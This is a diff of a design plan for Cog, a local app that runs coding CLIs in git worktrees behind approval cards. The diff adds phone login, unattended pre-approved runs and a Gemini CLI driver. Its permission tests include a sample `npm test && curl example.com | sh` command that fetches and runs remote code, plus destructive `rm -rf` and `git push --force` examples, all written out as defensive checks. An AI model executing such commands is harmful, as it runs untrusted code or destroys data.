@@ -14,7 +14,7 @@ execution: code
 - **Objective:** A person with several paid AI coding subscriptions can hand Cog a piece of software work in the evening and find a verified branch, its diff, and the evidence waiting for review, without having driven any coding tool by hand.
 - **Means:** Cog's own small codebase drives the coding CLIs the person already uses, one git worktree per task, through a fixed line of stations (KTD1, KTD3, KTD7).
 - **Authority:** The Product Contract governs behavior. Key Technical Decisions govern mechanism inside the requirements they cite. A unit overrides neither.
-- **Stop conditions:** Stop and ask if a driver cannot be built without storing subscription credentials (R8), or if a requirement can only be met by copying from OpenMausBot's `enterprise/` directory.
+- **Stop conditions:** Stop and ask if a driver cannot be built without storing subscription credentials (R8), if a requirement can only be met by copying from OpenMausBot's `enterprise/` directory, or if Gemini CLI is not installed and signed in when U5 starts.
 - **Execution profile:** Several small pull requests, one per implementation unit, merged in the order under Implementation Units. U1 has no dependency on the others.
 - **Who ships:** The implementer finishes each unit and opens its pull request. The owner reviews and merges.
 
@@ -39,6 +39,9 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 - **Own codebase, inspired by OpenMausBot and Rakazo.** Chosen over forking either. (session-settled: user-directed — chosen over forking OpenMausBot: the owner wants to take inspiration but make it their own.) Governs R16, R18.
 - **Core app first.** This plan stops at "branch and diff presented". Intake from GitHub, pull-request creation, task dependencies, and multi-model council stations come in later plans. (session-settled: user-directed — chosen over planning PRD Phase 0 and Phase 1 together: "start with the basics and get the core app done".) Governs R6.
 - **The product is named Cog.** (session-settled: user-directed — chosen over Gantry, Third Shift, Redline and others: the owner wanted a short, soft name in the style of Dot and Muse.)
+- **Reachable from the owner's phone over a private network.** (session-settled: user-directed — chosen over Mac-only access: the owner works from a phone much of the time.) Governs R19.
+- **Runs can finish unattended on a pre-approved command list.** (session-settled: user-directed — chosen over attended runs only: the goal is evening hand-off and a branch in the morning.) Governs R20.
+- **Gemini CLI is the second supported CLI.** (session-settled: user-directed — chosen over Codex, Grok CLI, and Claude Code only: it is the one the owner will install first.) Governs R7.
 - **Drive existing CLIs, do not replace them.** From the PRD's non-goals. Governs R7, R8.
 - **A person approves before anything leaves the machine.** From the PRD. In this plan Cog itself pushes and posts nothing; each CLI still sends prompts and code to its model provider under the owner's login. Governs R6, R10.
 
@@ -55,7 +58,7 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 
 **Models and subscriptions**
 
-- R7. Each role (planner, implementer, reviewer) is assigned a driver and model in configuration, changeable per run.
+- R7. Each role (planner, implementer, reviewer) is assigned a driver and model in configuration, changeable per run. This version supports Claude Code and Gemini CLI.
 - R8. Drivers use the login the owner already has in each CLI. Cog never asks for, reads, or stores subscription credentials, and never causes a subscription session to be billed as metered API use.
 - R9. When a driver reports a rate limit, the role falls back to the next driver configured for it, and the run records the switch.
 
@@ -63,7 +66,8 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 
 - R10. When an agent needs permission for an action, the action pauses as an approval card the owner answers in the web client. A pending approval waits until answered and survives a restart.
 - R11. After the owner approves the same kind of action for the same role a configured number of times, the card offers standing permission. Standing permissions are narrow, listed, and revocable. A fixed list of dangerous actions is never eligible.
-- R12. Every approval decision and every action that ran on standing permission is recorded in an append-only log.
+- R12. Every approval decision and every action that ran on standing or pre-approved permission is recorded in an append-only log.
+- R20. When starting a run, the owner confirms a list of commands that run's agents may use in that repository without asking. The never-eligible list in R11 still always asks.
 
 **Visibility**
 
@@ -73,6 +77,7 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 **Resilience and setup**
 
 - R15. After Cog restarts, finished tasks are not repeated. A task that was mid-turn is retried once and otherwise marked interrupted for the owner to resume.
+- R19. The owner can use Cog from their phone over a private network. Every request, from any device, must carry the owner's login, and Cog listens only on the addresses the owner configured.
 - R16. A technical user reaches a first completed run within 15 minutes of cloning, with no Docker, database server, or external account beyond the CLIs already installed.
 
 **Wireframe**
@@ -91,9 +96,12 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 - **AE1. Plan gate.** Covers R2. Given a run whose planner returned three tasks, when the owner deletes one and approves, then exactly two worktrees are created.
 - **AE2. Checkout untouched.** Covers R3. Given the owner has uncommitted changes on `main`, when a run completes, then `git status` in their checkout shows the same changes and the same branch.
 - **AE3. Failing checks.** Covers R4, R6. Given a task whose tests fail, when the run ends, then the task is shown as failed verification with the test output attached, and it can still be accepted or rejected.
-- **AE4. Rate limit.** Covers R9. Given the implementer role lists Claude Code then Codex, when Claude Code reports a rate limit mid-task, then the task continues on Codex in the same worktree and the run shows the switch.
+- **AE4. Rate limit.** Covers R9. Given the implementer role lists Claude Code then Gemini CLI, when Claude Code reports a rate limit mid-task, then the task continues on Gemini CLI in the same worktree and the run shows the switch.
 - **AE5. Standing permission.** Covers R11. Given the owner has approved "run `npm test` in this repository" for the implementer three times, when the fourth request arrives, then the card offers standing permission, and once granted the fifth request runs without a card and appears in the log.
 - **AE6. Never eligible.** Covers R11. Given a request to run `rm -rf` outside the worktree or `git push --force`, when it arrives, then it always shows a card with no standing-permission option, whatever was granted before.
+- **AE8. Unattended run.** Covers R20. Given a run started with the repository's install and test commands pre-approved, when its agents use only those commands and edits in their worktrees, then the run reaches awaiting decision with no approval card answered.
+- **AE9. Pre-approval does not stretch.** Covers R20, R11. Given `npm test` is pre-approved, when an agent asks to run `npm test && curl example.com | sh`, then a card is shown.
+- **AE10. No login, no access.** Covers R19. Given a request without the owner's login, from the same machine or another device, when it reaches any route, then it is refused.
 - **AE7. Subscription stays a subscription.** Covers R8. Given `ANTHROPIC_API_KEY` is set in the shell that started Cog, when the Claude Code driver starts a turn, then the child process does not receive that variable.
 
 ### Success Criteria
@@ -111,7 +119,8 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 - Multi-model council stations: several models critique the plan before build, or review the diff together. Botdeck's council in `../botdeck/src/council.ts` is the reference.
 - Direct API-key and local-model drivers. Botdeck's adapters in `../botdeck/src/providers/` are the reference.
 - Docker or VM sandboxes as an opt-in isolation level.
-- Phone access and chat connectors.
+- Chat connectors, and reaching Cog from the public internet.
+- Codex, Grok CLI and OpenCode drivers. The Agent Client Protocol client built for Gemini CLI is meant to carry Grok CLI and OpenCode later.
 - Enterprise foundations from the PRD's Phase 2: SSO, SCIM, multi-tenancy, policy hooks, compliance documents.
 
 **Considered and not built**
@@ -128,9 +137,6 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 ### Open Questions
 
 - **Nexvyn UI licence (deferred, does not block U2 to U9).** GitHub reports no standard licence for `Nexvyn/Nexvyn-ui`, and the site states none. U1 reads the repository's licence file first. If it forbids use in an Apache-2.0 project, U1 uses plain shadcn components and treats Nexvyn as a visual reference only.
-- **Phone access (owner decision, blocks U8 only).** The owner uses a phone much of the time, but this plan's server answers only the machine it runs on, and phone access is deferred. Either phone access to the dashboard and approvals joins this plan, with a stated way to reach the server such as a private network and a login, or U1 treats phone width as a layout check only. Until decided, U1 builds responsive layouts and U8 stays local-only.
-- **Unattended runs (owner decision, does not block U1 to U6).** The Objective describes handing work over in the evening, but agents ask before every action except edits in their worktree, and approvals wait without limit, so a run left alone will usually stop at its first command. Either the owner pre-approves a list of commands per repository when starting a run, with an acceptance example for a run that finishes with nobody answering, or the Objective is reworded to an attended run for this version.
-- **Which second CLI comes first (owner decision, blocks U5 only).** Only Claude Code is installed. U5 as written builds Codex and three ACP CLIs against fakes written from documentation. Naming the one the owner will install and sign in to first lets U5 record a real transcript and run a real smoke test for it, and move the others to follow-up work.
 - **Provider terms for unattended CLI use (owner decision, does not block).** Cog drives each vendor's official CLI in its documented headless mode with the owner's own login. Whether a consumer subscription permits unattended overnight use is a terms question per provider that research did not settle. Rakazo's documentation flags a different mechanism, in-app "Sign in with Claude", as prohibited by Anthropic. The owner should confirm for each subscription before leaving runs unattended. A related unknown is billing: whether a provider counts headless CLI turns against the same plan allowance as interactive use was not verified, and R8 depends on it.
 
 ### Sources
@@ -148,17 +154,18 @@ Two open-source "Grok Bot alternatives" were studied as possible bases. OpenMaus
 
 - KTD1. **New repository, Apache-2.0, written from the contracts and not copied wholesale.** OpenMausBot's driver layer is 39k lines importing 213 paths outside itself, so it cannot be lifted as a module. Cog re-types the contract and may copy only small self-contained files, each recorded in `NOTICE` (R18). Apache-2.0 matches both sources. Files from OpenMausBot's driver layer that its `NOTICE` marks as adapted from T3 Code also keep that MIT notice, so the implementer checks each copy candidate against that `NOTICE` first. Instantiates the "own codebase" Key Decision.
 - KTD2. **TypeScript on Node 24 or later, run directly with no server build step.** One process, `node:http`, one server-sent-events stream to the client, `node:sqlite` in a single database file under `~/.cog`. This is OpenMausBot's process model without its split across two databases and loose JSON files, and it is what Botdeck already runs on. It is what makes R16 reachable; Rakazo's Postgres and five services are the counter-example.
-- KTD3. **Drivers are stdio subprocesses speaking each CLI's structured headless protocol, behind one adapter contract.** Claude Code uses stream-json in and out with one retained process per task and `--resume`. Codex uses its app-server JSON-RPC. Grok CLI, OpenCode and Gemini share one Agent Client Protocol client with a small support object per CLI. The contract has `sendTurn`, `interruptTurn`, `respondToRequest`, `onEvent`, an opaque resume cursor, and capability flags, and every driver emits one normalized event union. No pty and no vendor agent SDK. This is OpenMausBot's verified design and the one Rakazo lacks: Rakazo reduces the CLI to a one-turn model endpoint, which discards the agent the subscription pays for.
+- KTD3. **Drivers are stdio subprocesses speaking each CLI's structured headless protocol, behind one adapter contract.** Claude Code uses stream-json in and out with one retained process per task and `--resume`. Gemini CLI uses an Agent Client Protocol client with a small support object per CLI, so Grok CLI and OpenCode can be added later as support objects. Codex, with its own app-server JSON-RPC, is deferred. The contract has `sendTurn`, `interruptTurn`, `respondToRequest`, `onEvent`, an opaque resume cursor, and capability flags, and every driver emits one normalized event union. No pty and no vendor agent SDK. This is OpenMausBot's verified design and the one Rakazo lacks: Rakazo reduces the CLI to a one-turn model endpoint, which discards the agent the subscription pays for.
 - KTD4. **Subscription safety is enforced in the driver's process launch.** The child environment is built from an allowlist, and provider API-key variables are removed before spawn (R8, AE7). MCP configuration is isolated with `--strict-mcp-config`, and the Claude Code driver launches with `--setting-sources project`, so a run inherits none of the owner's personal MCP servers, permission allow rules, hooks or plugins while the repository's own instructions still load. Without this the CLI applies the owner's own allow rules before it ever calls the broker. Cog implements no in-app OAuth and calls no unofficial usage endpoints. Rakazo's `providers/cli-model/claude-code/cli.ts` (301 lines, Node built-ins only) is the candidate file to lift for the allowlist, process-group kill, and version and login probe.
-- KTD5. **Tool-level approvals go through a permission broker.** For Claude Code, `--permission-prompt-tool` points at a small stdio MCP proxy that forwards over a unix socket to an in-process broker. The broker writes the approval row, emits the event, and blocks until `respondToRequest`. Codex approvals arrive as server-to-client requests and ACP ones as permission requests, and both map to the same broker. Any broker failure denies. The implementer's mode lets it edit inside its worktree and asks for everything else. The planner and reviewer run read-only: write and edit tools are disallowed at launch and every command asks. The planner works in a detached worktree of the base commit that is removed once the plan is approved, so it never runs in the owner's checkout (R3). The reviewer works in the task worktree. The floor list is also passed to the CLI as ask rules, so an allow rule in the repository's project settings cannot run a floor action without the broker.
-- KTD6. **Standing permissions are narrow grants plus a safety floor, earned per role.** A grant is an exact command plus the source repository plus the working directory relative to the worktree root, or a named tool, scoped to a role. Approval counts use the same key, so approvals earned in one task apply to later tasks and runs on that repository (AE5). It is offered after the configured number of approvals (R11) and stored as a row. A never-list overrides every grant (AE6). The ladder logic comes from `../botdeck/src/autonomy.ts`; the grant shape and the floor come from OpenMausBot's `command-allowlist.ts` and `approval-mode.ts`.
+- KTD5. **Tool-level approvals go through a permission broker.** For Claude Code, `--permission-prompt-tool` points at a small stdio MCP proxy that forwards over a unix socket to an in-process broker. The broker writes the approval row, emits the event, and blocks until `respondToRequest`. ACP permission requests map to the same broker. Any broker failure denies. The implementer's mode lets it edit inside its worktree and asks for everything else. The planner and reviewer run read-only: write and edit tools are disallowed at launch and every command asks. The planner works in a detached worktree of the base commit that is removed once the plan is approved, so it never runs in the owner's checkout (R3). The reviewer works in the task worktree. The floor list is also passed to the CLI as ask rules, so an allow rule in the repository's project settings cannot run a floor action without the broker.
+- KTD6. **Standing permissions are narrow grants plus a safety floor, earned per role.** A grant is an exact command plus the source repository plus the working directory relative to the worktree root, or a named tool, scoped to a role. Approval counts use the same key, so approvals earned in one task apply to later tasks and runs on that repository (AE5). It is offered after the configured number of approvals (R11) and stored as a row. A run's pre-approved list (R20) is stored as grants scoped to that run. A pre-approved entry matches a request whose leading words equal the entry and which contains no shell operators that chain, pipe, substitute or redirect (AE9). A never-list overrides every grant (AE6). The ladder logic comes from `../botdeck/src/autonomy.ts`; the grant shape and the floor come from OpenMausBot's `command-allowlist.ts` and `approval-mode.ts`.
 - KTD7. **Isolation is one git worktree per task, on the host.** Worktrees live under `~/.cog/worktrees/<run>/<task>` on branch `cog/<run>/<task>`, created from the repository's current `HEAD` commit. The agent's working directory is the worktree. Neither studied project has worktrees, so this is new code. When an implementer's turn ends, and before checks run, Cog itself stages and commits everything in the worktree to the task branch and records the commit on the task. The agent is never relied on to commit. The diff summary is base commit to branch head, and a worktree is removed only when it is clean. Setup commands configured per repository, such as a dependency install, run in each new worktree before the build, because a fresh worktree holds only tracked files. Check commands (R4) run on the host in the worktree, which is the same trust the owner already gives their own test suite.
 - KTD8. **Runs and tasks are two row-driven state machines, with attempts under tasks.** The run row carries planning, awaiting plan approval, running, awaiting decision, done and cancelled. Each task row carries its own station: queued, building, verifying, reviewing, awaiting decision, blocked, interrupted, decided. Tasks go through build, verify and review one at a time. The station a run shows on the board is that of its earliest unfinished task. Each task carries a `depends_on` field that this plan always leaves empty, so the later task-graph plan needs no migration. State changes and their events are written in one transaction. This borrows OpenMausBot's assignment record with its restart policy and harness-recorded evidence.
 - KTD9. **Restart recovery reconciles from the database.** CLI processes do not survive a restart. On start, a task whose attempt was mid-turn is re-driven once using the stored resume cursor and otherwise marked interrupted (R15). A task that was blocked on a pending approval is parked instead: it is not re-driven and keeps its retry. Its approval row stays pending. When the owner answers, Cog re-drives the task from its resume cursor and applies the stored answer once to the first matching request from the new process. A request that does not match raises a new card and closes the old row as superseded (R10). This is OpenMausBot's policy with the "never rerun after an outward action" clause left for the pull-request plan.
-- KTD10. **Usage is an append-only ledger with a cost kind.** One row per turn: tokens, driver, model, run, task, and cost as `reported`, `estimated`, or `subscription` with a nullable amount (R13). Claude Code and Codex report usage and rate-limit events in-band, so no extra calls are needed. The cost kind comes from the driver's billing kind, which the login probe sets from the CLI's own status output without reading any credential. It never comes from whether the CLI printed a cost: Claude Code prints a running dollar total on subscription logins too. `reported` applies only to a metered login, and its amount is the growth in the CLI's running total since the previous turn.
+- KTD10. **Usage is an append-only ledger with a cost kind.** One row per turn: tokens, driver, model, run, task, and cost as `reported`, `estimated`, or `subscription` with a nullable amount (R13). Claude Code reports usage and rate-limit events in-band, so no extra calls are needed. The cost kind comes from the driver's billing kind, which the login probe sets from the CLI's own status output without reading any credential. It never comes from whether the CLI printed a cost: Claude Code prints a running dollar total on subscription logins too. `reported` applies only to a metered login, and its amount is the growth in the CLI's running total since the previous turn.
 - KTD11. **Routing is configuration, with ordered fallbacks.** Each role lists drivers in preference order. A normalized rate-limit event advances the task to the next one in the same worktree (R9, AE4). The fallback driver starts a fresh session with a handoff prompt: the task, its acceptance criteria, a note that an earlier attempt was cut off, and the worktree's current diff summary. Resume cursors are never passed between drivers. With no fallback left, the task is blocked with the reset time when the CLI gave one, and the engine resumes it on its first driver once that time passes, including after a restart. Without a reset time it waits for the owner. There is no automatic choice by task type in this plan.
 - KTD12. **The client is React with Vite, Tailwind and shadcn components, with Nexvyn UI for the shell where its licence allows.** The owner named Nexvyn UI. It installs through the shadcn registry and supplies sidebars, an AI input, and form controls. It has no tables, cards, charts or chat blocks, so those come from plain shadcn. The wireframe in U1 is this same app on mock data, so it is not thrown away (R17). The built client is static files served by the Cog process.
-- KTD13. **Drivers are tested against fake CLIs.** Each driver has a small script that speaks its protocol from a recorded transcript. Only Claude Code is installed on the owner's machine today, so Codex and ACP drivers are proven by fakes until those CLIs are installed. This is OpenMausBot's testing pattern and Botdeck's mock-provider pattern.
+- KTD14. **One owner login guards every route, and the listen addresses are configuration.** Cog creates a random token on first start, stores it under `~/.cog` readable only by the owner, and shows it once. A device signs in with it and receives a session cookie that scripts cannot read. Requests from the same machine need the login too, because check commands run agent-written code on that machine. Cog listens on the loopback address plus any address the owner lists, such as the Mac's private-network address, and never on all addresses by default. It keeps the `Host` and `Origin` checks, with the configured host names allowed. The private network supplies encryption in transit, and Cog adds none.
+- KTD13. **Drivers are tested against fake CLIs built from recorded real transcripts.** Each driver has a small script that replays its protocol. The owner installs and signs in to Gemini CLI before U5, so both drivers get a recorded transcript and a real smoke run. This is OpenMausBot's testing pattern and Botdeck's mock-provider pattern.
 
 ### High-Level Technical Design
 
@@ -166,16 +173,14 @@ Components and the direction of calls:
 
 ```mermaid
 flowchart LR
-  UI["Web client"] -- "HTTP + one event stream" --> API["Cog server"]
+  UI["Web client, Mac or phone"] -- "HTTP + one event stream, owner login" --> API["Cog server"]
   API --> ENG["Run engine"]
   ENG --> WT["Worktree manager"]
   ENG --> DRV["Driver contract"]
   ENG --> VER["Check runner"]
   DRV --> CC["Claude Code"]
-  DRV --> CX["Codex"]
-  DRV --> ACP["ACP client: Grok, OpenCode, Gemini"]
+  DRV --> ACP["ACP client: Gemini CLI"]
   CC -- "permission request" --> BRK["Permission broker"]
-  CX -- "permission request" --> BRK
   ACP -- "permission request" --> BRK
   BRK --> DB[("SQLite: runs, tasks, attempts, events, approvals, grants, usage")]
   ENG --> DB
@@ -224,23 +229,24 @@ cog/
   src/
     server.ts
     store/            schema, migrations, atomic writes
-    drivers/          contract.ts, events.ts, launch.ts, claude-code.ts, codex.ts, acp/
+    drivers/          contract.ts, events.ts, launch.ts, claude-code.ts, acp/
     approvals/        broker.ts, permission-proxy.ts, grants.ts, floor.ts
     worktrees.ts
     engine/           run.ts, stations.ts, recover.ts, roles.ts
     checks.ts
     usage.ts
-    api/              routes.ts, stream.ts
+    api/              routes.ts, stream.ts, auth.ts
   web/                Vite + React client; mock data lives in web/src/mock/
   test/
-    fakes/            fake-claude.ts, fake-codex.ts, fake-acp.ts, transcripts/
+    fakes/            fake-claude.ts, fake-acp.ts, transcripts/
 ```
 
 ### Assumptions
 
 - The owner's repositories are local git repositories with at least one commit.
 - Check commands and setup commands are supplied per repository in configuration. Cog does not detect them.
-- One owner uses one Cog instance. Requests come only from the same machine, and the server refuses others, as Botdeck's does.
+- One owner uses one Cog instance, from the Mac and from a phone on the same private network.
+- The owner installs and signs in to Gemini CLI before U5 starts.
 
 ### Risks
 
@@ -260,7 +266,7 @@ cog/
 
 **Goal:** Every screen exists as a navigable client on mock data, so the concept can be judged before backend work.
 
-**Requirements:** R17, and it previews R2, R6, R10, R11, R13, R14.
+**Requirements:** R17, and it previews R2, R6, R10, R11, R13, R14, R19, R20.
 
 **Dependencies:** None.
 
@@ -270,7 +276,7 @@ cog/
 
 1. Read the licence file in `Nexvyn/Nexvyn-ui`, create `NOTICE` with the outcome, or fall back to plain shadcn (Open Questions).
 2. Build the shell: a Nexvyn sidebar, and an approval tray visible on every screen.
-3. Build six screens on mock data: runs board with one column per station, run detail (task list, live transcript, diff, evidence, accept and reject), new run (prompt or spec, repository, roles, reviewer toggle), approvals and standing permissions with the action log, usage by model and by run, and settings (drivers found, roles and fallbacks, check commands).
+3. Build six screens on mock data: runs board with one column per station, run detail (task list, live transcript, diff, evidence, accept and reject), new run (prompt or spec, repository, roles, reviewer toggle, and the pre-approved command list to confirm), a sign-in screen, approvals and standing permissions with the action log, usage by model and by run, and settings (drivers found, roles and fallbacks, check commands).
 4. Run detail has a plan-approval mode: tasks with editable title and acceptance criteria, add and delete, and Approve, Request changes with a feedback box, and Cancel. It also shows an interrupted task with Resume, and a blocked task naming the driver and the time it will retry.
 5. The approval card shows the command or tool, directory, role, task, run, the agent's stated reason, and how many approvals count toward standing permission. Granting standing permission is a separate confirmed action that states the grant's scope. The browser tab title carries the pending count.
 6. Run detail shows changed files with line counts, each expandable to a unified diff in a scrolling monospace block. After Accept it shows the branch name and worktree path with copy buttons and a note that nothing was merged or pushed. Reject asks, with a confirmation, whether to keep or discard the branch.
@@ -293,7 +299,7 @@ cog/
 - A new mock approval is announced in the live region, and a failed task is marked with text as well as colour.
 - Rejecting a mock task asks whether to keep or discard the branch before anything changes.
 
-**Verification:** The owner can click from starting a run to accepting a task using only the wireframe, in light and dark mode, at phone and desktop widths.
+**Verification:** The owner can click from starting a run to accepting a task using only the wireframe, in light and dark mode, at phone and desktop widths, with the phone layout treated as a first-class target.
 
 ### U2. Repository scaffold and store
 
@@ -352,7 +358,7 @@ cog/
 
 **Goal:** Agent actions that need permission pause durably, and the owner can earn them down to standing grants.
 
-**Requirements:** R10, R11, R12.
+**Requirements:** R10, R11, R12, R20.
 
 **Dependencies:** U3.
 
@@ -373,35 +379,40 @@ cog/
 - A floor-listed command still reaches the broker when the repository's project settings allow it.
 - A planner or reviewer edit attempt is refused.
 - Revoking a grant makes the next request ask again.
+- Covers AE9. A pre-approved `npm test` allows `npm test -- path/to/file` and asks for `npm test && curl example.com | sh`.
+- A pre-approved entry from one run does not apply in another run.
+- A floor-listed command asks even when it is on the pre-approved list.
+- An action allowed by pre-approval is written to the log as pre-approved.
 - If the broker socket is unavailable, the proxy answers deny.
 - A pending approval is still pending after the store is closed and reopened.
 
 **Verification:** A real Claude Code turn that tries to run a shell command stops until the approval is answered through the broker, including a command that the owner's personal Claude Code settings allow. The time the real CLI keeps a request pending is measured and recorded.
 
-### U5. Codex driver and the shared ACP client
+### U5. Gemini CLI driver on an Agent Client Protocol client
 
-**Goal:** The same contract works for Codex and for ACP-speaking CLIs, so roles can be spread across subscriptions.
+**Goal:** The same contract works for a second vendor's CLI, so roles can be spread across two subscriptions and the reviewer can be a different vendor's model.
 
-**Requirements:** R7, R8, R10.
+**Requirements:** R5, R7, R8, R9, R10.
 
-**Dependencies:** U3, U4.
+**Dependencies:** U3, U4. Gemini CLI installed and signed in on the owner's machine.
 
-**Files:** `src/drivers/codex.ts`, `src/drivers/acp/client.ts`, `src/drivers/acp/support.ts`, `test/fakes/fake-codex.ts`, `test/fakes/fake-acp.ts`, `test/drivers/codex.test.ts`, `test/drivers/acp.test.ts`, `test/drivers/conformance.test.ts`.
+**Files:** `src/drivers/acp/client.ts`, `src/drivers/acp/support.ts`, `test/fakes/fake-acp.ts`, `test/fakes/transcripts/`, `test/drivers/acp.test.ts`, `test/drivers/conformance.test.ts`.
 
-**Approach:** Codex speaks app-server JSON-RPC, with approvals as server-to-client requests routed to the broker. The ACP client is written once, with support entries for Grok CLI, OpenCode and Gemini that name the launch command and capability flags. One conformance suite runs the same scenarios against every driver through its fake.
+**Approach:** Write the ACP client once, with a support entry for Gemini CLI naming its launch command and capability flags. Route ACP permission requests to the broker. Apply the same launch rules as U3: environment allowlist, provider API-key removal, and the billing-kind probe. One conformance suite runs the same scenarios against every driver through its fake.
 
-**Execution note:** None of these CLIs is installed on the owner's machine. Build against fakes from the documented protocols, and flag each driver as unverified against the real CLI until it has been run once.
+**Execution note:** Record a real Gemini CLI transcript first and build the fake from it. If Gemini CLI is not installed when this unit starts, stop and ask the owner; do not build the driver from documentation alone.
 
-**Patterns to follow:** OpenMausBot's Codex driver and `server/drivers/acp/core.ts` for protocol handling. Rakazo's single conformance test across providers.
+**Patterns to follow:** OpenMausBot's `server/drivers/acp/core.ts` for protocol handling. Rakazo's single conformance test across providers.
 
 **Test scenarios:**
 
-- The conformance suite (turn, resume, interrupt, permission request, usage, rate limit, malformed input) passes for the Claude Code, Codex and ACP drivers.
-- A Codex server-to-client approval request creates a pending approval, and the answer is returned as the JSON-RPC response.
-- An ACP CLI that does not advertise session resume is reported as not resumable through its capability flag.
+- The conformance suite (turn, resume, interrupt, permission request, usage, rate limit, malformed input) passes for the Claude Code and Gemini CLI drivers.
+- An ACP permission request creates a pending approval, and the answer is returned as the protocol response.
+- A CLI that does not advertise session resume is reported as not resumable through its capability flag, and recovery re-drives it with the handoff prompt instead of a resume cursor.
+- With a provider API key set in the parent environment, the fake reports that it did not receive it.
 - A support entry whose command is not installed is listed as unavailable and cannot be assigned to a role.
 
-**Verification:** Settings lists each driver as available, unavailable, or unverified, matching what is installed.
+**Verification:** A real turn on Gemini CLI completes with its usage row, and a real run uses Claude Code as implementer and Gemini CLI as reviewer.
 
 ### U6. Worktree manager
 
@@ -431,7 +442,7 @@ cog/
 
 **Goal:** A run moves through the stations on its own, stopping only at the gates and for approvals.
 
-**Requirements:** R1, R2, R4, R5, R6, R9, R15.
+**Requirements:** R1, R2, R4, R5, R6, R9, R15, R20.
 
 **Dependencies:** U3, U4, U6. U5 for the reviewer and fallback scenarios against a second driver.
 
@@ -462,21 +473,22 @@ cog/
 - Recovery: a finished task is not rebuilt; a task that was mid-turn is retried once from its resume cursor; a second interruption marks it interrupted.
 - A run in awaiting plan approval is still there after a restart.
 - Recovery with a pending approval: the task is parked and keeps its retry; answering the card re-drives it, and it continues with no second card.
+- Covers AE8. A run whose agents use only pre-approved commands and worktree edits reaches awaiting decision with no approval answered.
 - A markdown spec file is accepted as the run's input, and a missing file is rejected before the run is created.
 
-**Verification:** A real run on a repository with installed dependencies and a setup command, with Claude Code as planner and implementer, ends at awaiting decision with a committed branch whose checks passed.
+**Verification:** A real run on a repository with installed dependencies and a setup command, with Claude Code as planner and implementer and its install and test commands pre-approved, is started and left alone, and ends at awaiting decision with a committed branch whose checks passed.
 
 ### U8. API, event stream, and wiring the client
 
 **Goal:** The wireframe becomes the working client.
 
-**Requirements:** R1, R2, R6, R10, R13, R14.
+**Requirements:** R1, R2, R6, R10, R13, R14, R19.
 
 **Dependencies:** U1, U7.
 
-**Files:** `README.md`, `src/server.ts`, `src/api/routes.ts`, `src/api/stream.ts`, `web/src/api/`, `web/src/screens/` (replace mock data), `test/api/routes.test.ts`, `test/api/stream.test.ts`.
+**Files:** `README.md`, `src/server.ts`, `src/api/routes.ts`, `src/api/stream.ts`, `src/api/auth.ts`, `web/src/api/`, `web/src/screens/` (replace mock data), `test/api/routes.test.ts`, `test/api/stream.test.ts`, `test/api/auth.test.ts`.
 
-**Approach:** Routes for runs, plan edits and approval, task decisions, approvals, grants, settings, transcripts, and a task's per-file diff. Write `README.md` covering install, first run, role configuration, and setup and check commands. One event stream carries change signals, and the client refetches what changed. The server binds to the loopback address and refuses foreign `Host` and `Origin` headers. Mock data stays available behind a demo flag.
+**Approach:** Routes for runs, plan edits and approval, task decisions, approvals, grants, settings, transcripts, and a task's per-file diff. Write `README.md` covering install, first run, role configuration, setup and check commands, and phone access over a private network. One event stream carries change signals, and the client refetches what changed. Sign-in, listen addresses and header checks follow KTD14. Mock data stays available behind a demo flag.
 
 **Patterns to follow:** `../botdeck/src/server.ts` for the host and origin checks and the stream.
 
@@ -486,10 +498,14 @@ cog/
 - Answering an approval through the API unblocks the waiting agent in an engine running against fakes.
 - A client that connects after events were emitted can fetch the full transcript and then receive only new events.
 - A request with a foreign `Origin`, or a non-JSON body on a write route, is refused.
+- Covers AE10. A request with no session is refused on every route except sign-in, from the loopback address as well as from a configured address.
+- Signing in with the token sets a session cookie that scripts cannot read; a wrong token is refused, and repeated wrong tokens are slowed down.
+- With no extra address configured, Cog listens on the loopback address only.
+- The token file is created readable only by the owner, and the token never appears in logs or API responses after first start.
 - Editing the plan after it was approved is refused.
 - Accepting or rejecting a task that is not awaiting a decision is refused.
 
-**Verification:** The click-through from U1 works against a real run, with the transcript updating live, and a new user can follow `README.md` to a first run.
+**Verification:** The click-through from U1 works against a real run, with the transcript updating live, a new user can follow `README.md` to a first run, and the owner approves a real request from their phone over the private network.
 
 ### U9. Usage ledger and the dashboard
 
@@ -527,14 +543,17 @@ cog/
 | Client tests | `npm test --prefix web` | U1, U8, U9 |
 | Client build | `npm run build --prefix web` | U1, U8, U9 |
 | Driver conformance | `test/drivers/conformance.test.ts` passes for every driver | U5 |
+| Real-CLI smoke, second driver | One run with Claude Code as implementer and Gemini CLI as reviewer | U5, U7 |
+| Phone | One approval answered from the owner's phone over the private network | U8 |
+| Unattended | AE8 holds on a real repository with nobody answering | U7 |
 | Real-CLI smoke | One run on a sample repository with the installed Claude Code reaches awaiting decision | U7, U8 |
 | Checkout safety | AE2 holds on the owner's real repository | U6, U7 |
 
-Tests against fakes prove protocol handling and engine logic. They do not prove that a real CLI still speaks the recorded protocol, which is what the real-CLI smoke is for. Codex and ACP drivers have no real-CLI smoke until those CLIs are installed, and they stay labeled unverified.
+Tests against fakes prove protocol handling and engine logic. They do not prove that a real CLI still speaks the recorded protocol, which is what the real-CLI smoke is for. Both drivers in this plan have one.
 
 ## Definition of Done
 
-- Every requirement R1 to R18 is met, and every acceptance example AE1 to AE7 is covered by a passing test.
+- Every requirement R1 to R20 is met, and every acceptance example AE1 to AE10 is covered by a passing test.
 - All gates in the Verification Contract pass.
 - A first run from a fresh clone completes within the 15 minutes in R16, timed once on the owner's machine.
 - `NOTICE` lists every copied file with its source and licence, and nothing originates from OpenMausBot's `enterprise/` directory.
